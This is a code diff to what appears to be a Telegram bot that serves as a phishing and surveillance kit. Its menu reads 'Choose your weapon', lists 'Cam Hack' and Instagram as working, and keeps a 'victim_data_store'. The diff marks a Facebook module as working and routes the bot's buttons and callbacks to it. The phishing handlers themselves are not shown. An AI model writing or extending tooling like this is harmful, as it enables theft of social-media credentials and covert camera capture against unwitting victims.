@@ -3,7 +3,11 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMar
 import time
 import threading
 from bot.config import BOT_TOKEN
-from bot.buttons import handle_cam_hack, handle_insta_button, handle_insta_callback
+from bot.buttons import (
+    handle_cam_hack,
+    handle_insta_button, handle_insta_callback,
+    handle_face_button, handle_face_callback
+)
 from bot.server import app
 from bot.utils.storage import link_cache, victim_data_store
 
@@ -67,7 +71,7 @@ def show_main_menu(message):
         "🔥 *Choose your weapon:*\n\n"
         "📸 Cam Hack (working)\n"
         "📸 Instagram (working)\n"
-        "📘 Facebook (coming soon)\n"
+        "📘 Facebook (working)\n"
         "🐦 Twitter (coming soon)\n"
         "👻 Snapchat (coming soon)\n"
         "📧 Gmail (coming soon)\n"
@@ -92,7 +96,9 @@ def route_buttons(message):
         handle_cam_hack(bot, message, get_bottom_buttons)
     elif text == "📸 Instagram":
         handle_insta_button(bot, message, get_bottom_buttons)
-    elif text in ["📘 Facebook", "🐦 Twitter", "👻 Snapchat", "📧 Gmail", "🎮 Free Fire", "🔗 All Links"]:
+    elif text == "📘 Facebook":
+        handle_face_button(bot, message, get_bottom_buttons)
+    elif text in ["🐦 Twitter", "👻 Snapchat", "📧 Gmail", "🎮 Free Fire", "🔗 All Links"]:
         bot.send_message(user_id, f"⏳ *{text}* coming soon.", reply_markup=get_bottom_buttons(), parse_mode="Markdown")
     else:
         bot.send_message(user_id, "❌ Use buttons below.", reply_markup=get_bottom_buttons())
@@ -106,6 +112,11 @@ def handle_inline(call):
     # Instagram callbacks
     if data in ["ig_copy", "ig_back", "ig_menu"]:
         handle_insta_callback(bot, call)
+        return
+
+    # Facebook callbacks
+    if data in ["face_copy", "face_back", "face_menu"]:
+        handle_face_callback(bot, call)
         return
 
     # Generic copy
